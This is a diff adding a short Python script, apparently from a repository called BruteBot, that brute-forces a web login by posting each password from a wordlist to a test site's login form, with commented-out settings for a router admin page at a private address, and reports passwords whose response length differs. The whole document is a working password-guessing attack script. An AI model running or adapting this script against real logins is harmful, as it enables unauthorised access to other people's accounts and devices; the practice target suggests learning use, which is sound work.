@@ -1,1 +1,21 @@
 https://github.com/navin-maverick/BruteBot
+
+#! /usr/bin/python
+
+import requests
+
+url = "http://testphp.vulnweb.com/userinfo.php"
+
+# url = "https://192.168.1.182/cgi-bin/luci"
+
+loginpage = requests.get(url)
+org = len(loginpage.text)
+
+with open('pass.txt', 'r') as fh:
+    for word in fh.readlines():
+        password = word.replace("\n", "")
+        data = {'uname': 'test', 'pass': password}
+        # data = {'luci_username': 'test', 'luci_password': password}
+        response = requests.post(url, data = data)
+        if org != len(response.text):
+            print(password, len(response.text))
